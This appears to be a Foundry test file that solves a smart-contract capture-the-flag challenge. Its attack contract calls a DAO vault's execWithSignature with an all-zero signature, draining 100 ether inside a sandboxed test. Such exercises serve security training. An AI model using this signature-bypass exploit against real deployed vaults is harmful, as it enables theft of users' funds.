// SPDX-License-Identifier: UNLICENSED

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {DaoVaultImplementation, FactoryDao, IDaoVault} from "../src/7_crystalDAO/crystalDAO.sol";

/*////////////////////////////////////////////////////////////
//          DEFINE ANY NECESSARY CONTRACTS HERE             //
//    If you need a contract for your hack, define it below //
////////////////////////////////////////////////////////////*/

contract DaoVaultAttack {
    IDaoVault public vault;

    constructor(address _vault) {
        vault = IDaoVault(_vault);
    }

    function attack(address target, uint256 amount) external {
        // Prepare the parameters for execWithSignature
        uint8 v = 0;
        bytes32 r = 0;
        bytes32 s = 0;
        bytes memory execOrder = ""; // Empty bytes for a simple value transfer
        uint256 deadline = block.timestamp + 1 hours;

        // Execute the attack
        vault.execWithSignature(v, r, s, target, amount, execOrder, deadline);
    }

    // Allow the contract to receive ETH
    receive() external payable {}
}

/*////////////////////////////////////////////////////////////
//                     TEST CONTRACT                        //
////////////////////////////////////////////////////////////*/
contract Challenge7Test is Test {
    FactoryDao factory;

    address public whitehat = makeAddr("whitehat");
    address public daoManager;
    uint256 daoManagerKey;

    IDaoVault vault;

    function setUp() public {
        (daoManager, daoManagerKey) = makeAddrAndKey("daoManager");
        factory = new FactoryDao();

        vm.prank(daoManager);
        vault = IDaoVault(factory.newWallet());

        // The vault has reached 100 ether in donations
        deal(address(vault), 100 ether);
    }

    function testHack() public {
        vm.startPrank(whitehat, whitehat);
        /*////////////////////////////////////////////////////
        //               Add your hack below!               //
        //                                                  //
        // terminal command to run the specific test:       //
        // forge test --match-contract Challenge7Test -vvvv //
        ////////////////////////////////////////////////////*/

        // Deploy the attack contract
        DaoVaultAttack attackContract = new DaoVaultAttack(address(vault));

        // Perform the attack
        attackContract.attack(daoManager, 100 ether);

        //==================================================//
        vm.stopPrank();

        assertEq(daoManager.balance, 100 ether, "The Dao manager's balance should be 100 ether");
    }
}
